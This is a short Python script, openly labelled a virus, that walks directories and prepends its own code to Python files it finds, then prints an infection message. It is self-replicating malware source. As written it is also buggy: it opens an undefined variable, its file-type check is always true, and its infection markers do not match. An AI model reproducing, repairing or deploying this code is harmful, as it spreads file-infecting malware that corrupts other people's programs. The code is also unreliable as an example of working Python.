#VIRUS SAYS HI!

import os, glob, sys

def infectPy(path):
    virus_code = []
    with open(sys.argv[0], 'r', encoding='utf-8') as  f:
        lines = f.readlines()

        self_replication_part = False
        for line in lines:
            if line=="#VIRUS SAYS HI!":
                self_replication_part = True
            if not self_replication_part:
                virus_code.append(line)
            if line == "#VIRUS SAYS BYE!\n":
                break

    for filename in glob.iglob(path, recursive = True):
        if os.path.isfile(filename):
            if ".py" or ".pyw" in filename:
                with open(file, 'r') as f:
                    file_code = f.readlines()

                infected = False

                for line in file_code:
                    if line == "# VIRUS SAYS HI!\n":
                        infected = True
                        break

                if not infected:
                    final_code = []
                    final_code.extend(virus_code)
                    final_code.extend('\n')
                    final_code.extend(file_code)

                    with open(file, 'w') as f:
                        f.writelines(final_code)

        elif os.path.isdir(filename):
            infectPy(filename + "\\*")

def malicious_code():
    print("YOU HAVE BEEN INFECTED!")

path = "./"

infectPy(path)
malicious_code()

#VIRUS SAYS BYE!
